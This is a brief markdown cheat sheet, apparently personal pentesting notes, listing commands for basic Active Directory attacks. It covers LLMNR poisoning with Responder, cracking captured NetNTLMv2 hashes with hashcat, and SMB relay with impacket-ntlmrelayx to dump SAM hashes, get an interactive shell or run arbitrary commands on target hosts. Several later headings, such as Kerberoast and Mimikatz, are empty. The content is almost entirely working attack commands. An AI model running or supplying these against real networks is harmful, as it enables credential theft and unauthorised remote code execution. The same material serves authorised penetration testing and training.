# Basic AD Attacks
### LLMNR/Responder
Start Responder
```bash
sudo Responder -I <iface> -dwP
```
Crack w/ hashmode 5600 in hashcat
```bash
hashcat -a 0 -m 5600 <hashfile> <wordlist>
```
### SMB Relay
SMB Signing must be disabled or not enforced

Disable SMB and HTTP in responder
```bash
sudo vim /etc/responder/responder.conf
```
Turn on responder
```bash
sudo Responder -I <iface> -dwp
```
Create a targets.txt file (List of all relay attack targets. Just a list of IP address. (1 per line)

Dump SAM
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
Open a shell
```bash
nc 127.0.0.7 11000 #Open a netcat listener

sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
Run a command
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "<command"
```

### IPv6 DNS TakeOver

### Passback Attacks

### Pass the Hash (PTH)

### Kerberoast

### Token Impersonation

### LNK File Attacks

### Credential Dumping (Mimikatz)

